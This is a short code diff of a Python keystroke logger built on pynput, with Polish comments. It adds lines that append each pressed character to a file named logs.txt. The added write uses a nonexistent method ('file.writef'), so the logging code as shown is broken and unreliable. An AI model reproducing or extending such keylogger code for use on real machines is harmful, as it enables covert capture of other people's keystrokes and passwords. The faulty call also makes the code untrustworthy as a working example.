@@ -1,11 +1,17 @@
 from pynput import keyboard
 
 
+
+
 # Funkcja śledząca klikanie klawiszy
 def on_press(key):
     try:
         # Wyswietlamy znak (litera, cyfra)
         print(f"Wciśnięto {key.char}")
+        # Zapisujemy wciśnięty klawisz do logs.txt
+        with open("logs.txt", "a") as file:
+            file.writef(key.char)
+        
     except AttributeError:
         # Jesli klawisz typu shift,ctrl wypisz go
         print(f"Niestandardowy klawisz: {key}")
